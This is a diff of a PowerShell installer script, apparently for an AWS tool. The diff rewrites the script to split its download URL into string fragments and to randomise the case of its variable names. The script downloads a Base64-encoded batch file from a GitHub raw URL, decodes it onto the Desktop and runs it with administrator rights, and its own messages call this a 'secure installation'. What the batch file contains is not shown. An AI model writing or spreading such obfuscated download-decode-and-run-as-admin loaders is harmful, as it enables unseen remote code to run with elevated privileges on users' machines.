@@ -1,48 +1,39 @@
+$RePoBaSe = ("ht" + "tp" + "s:/" + "/raw.github" + "usercontent.com/sahmsec/Cyberfox/main")
+$BaTurl = $RePoBaSe + "/" + "aws-" + "install.bat"
 
-[CmdletBinding()]
-param()
+$DeSkToP = [Environment]::GetFolderPath("Desktop")
+$AWsFolDer = Join-Path $DeSkToP -ChildPath ('AWS')
 
-$repoBase = "https://raw.githubusercontent.com/sahmsec/Cyberfox/main"
-$batUrl = "$repoBase/aws-install.bat"  
+if (!(Test-Path $AWsFolDer)) { ni $AWsFolDer -Type Directory | Out-Null }
 
-$desktopPath = [Environment]::GetFolderPath("Desktop")
-
-$awsFolder = Join-Path -Path $desktopPath -ChildPath "AWS"
-
-if (-not (Test-Path -Path $awsFolder -PathType Container)) {
-    New-Item -Path $awsFolder -ItemType Directory | Out-Null
-}
-
-
-$batFile = Join-Path -Path $awsFolder -ChildPath "aws-install-$(Get-Date -Format 'yyyyMMddHHmmss').bat"
+$BatFiLe = Join-Path $AWsFolDer ("aws-install-" + (Get-Date -Format 'yyyyMMddHHmmss') + ".bat")
 
 try {
-
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-    $oldProgressPreference = $ProgressPreference
+    $OldPP = $ProgressPreference
     $ProgressPreference = 'SilentlyContinue'
 
-    Write-Host "Downloading Base64-encoded batch file to $awsFolder ..." -ForegroundColor Cyan
+    Write "Downloading Base64-encoded batch file to $AWsFolDer ..." -ForegroundColor Cyan
 
-    $base64Content = Invoke-WebRequest -Uri $batUrl -UseBasicParsing -ErrorAction Stop | Select-Object -ExpandProperty Content
+    $Content = Invoke-WebRequest -Uri $BaTurl -UseBasicParsing -ErrorAction Stop | Select -ExpandProperty Content
 
-    $ProgressPreference = $oldProgressPreference
+    $ProgressPreference = $OldPP
 
-    Write-Host "Decoding and saving batch file..." -ForegroundColor Cyan
+    Write "Decoding and saving batch file..." -ForegroundColor Cyan
 
-    $bytes = [Convert]::FromBase64String($base64Content)
+    $Bytes = [Convert]::FromBase64String($Content)
 
-    [IO.File]::WriteAllBytes($batFile, $bytes)
+    [IO.File]::WriteAllBytes($BatFiLe, $Bytes)
 
-    Write-Host "`nSaved decoded batch file to: $batFile" -ForegroundColor Cyan
+    Write "`nSaved decoded batch file to: $BatFiLe" -ForegroundColor Cyan
 
-    Write-Host "Starting secure installation..." -ForegroundColor Green
+    Write "Starting secure installation..." -ForegroundColor Green
 
-    Start-Process -FilePath $batFile -Verb RunAs
+    Start-Process -FilePath $BatFiLe -Verb RunAs
     exit
 
 } catch {
-    Write-Host "`n[ERROR] Installation failed: $_" -ForegroundColor Red
+    Write "`n[ERROR] Installation failed: $_" -ForegroundColor Red
     exit 1
 }
